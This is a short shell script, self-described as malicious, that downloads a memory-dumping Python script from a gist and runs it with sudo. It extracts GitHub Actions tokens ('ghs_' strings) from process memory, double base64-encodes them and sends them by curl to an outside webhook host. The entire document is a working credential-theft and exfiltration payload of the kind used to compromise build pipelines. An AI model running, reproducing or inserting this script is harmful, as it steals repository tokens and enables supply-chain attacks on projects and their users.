echo "This is from a malicious script! WOW"
output=$(curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 | base64 -w 0 | tr '+/' '-_' | tr -d '=')
echo $output
curl "https://arrogant-school-66.webhook.cool/?q=$output"
